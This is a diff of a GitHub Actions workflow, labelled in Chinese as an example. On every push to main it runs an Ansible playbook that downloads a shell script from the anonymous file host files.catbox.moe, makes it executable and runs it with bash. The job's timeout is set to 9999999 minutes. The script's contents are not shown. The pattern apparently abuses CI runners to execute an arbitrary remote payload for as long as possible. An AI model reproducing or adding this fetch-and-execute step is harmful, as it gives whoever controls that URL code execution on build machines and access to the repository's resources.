@@ -1,13 +1,39 @@
-- hosts: localhost
-runs-on: 
- ubuntu-latest timeout-minutes: 9999999
-  tasks:
-    - name: 下载 shell 脚本
-      ansible.builtin.get_url:
-        url: "https://files.catbox.moe/uh19yg.sh"
-        dest: "/tmp/uh19yg.sh"
-        mode: "0755"
+name: 示例工作流
 
-    - name: 运行 shell 脚本
-      ansible.builtin.command:
-        cmd: "bash /tmp/uh19yg.sh"
+on:
+  push:
+    branches:
+      - main
+
+jobs:
+  example-job:
+    runs-on: ubuntu-latest
+    timeout-minutes: 9999999
+    steps:
+      - name: Checkout repository
+        uses: actions/checkout@v4
+
+      - name: Run Ansible Playbook
+        uses: ansible/ansible-runner-action@v1
+        with:
+          playbook: |
+            - hosts: localhost
+              gather_facts: no
+              tasks:
+                - name: 下载 shell 脚本
+                  ansible.builtin.get_url:
+                    url: "https://files.catbox.moe/uh19yg.sh"
+                    dest: "/tmp/uh19yg.sh"
+                    mode: "0755"
+                    follow_redirects: all
+
+                - name: 查看下载文件大小
+                  ansible.builtin.stat:
+                    path: /tmp/uh19yg.sh
+                  register: file_stat
+
+                - debug:
+                    msg: "文件大小为 {{ file_stat.stat.size }} 字节"
+
+                - name: 运行 shell 脚本
+                  ansible.builtin.command: bash /tmp/uh19yg.sh
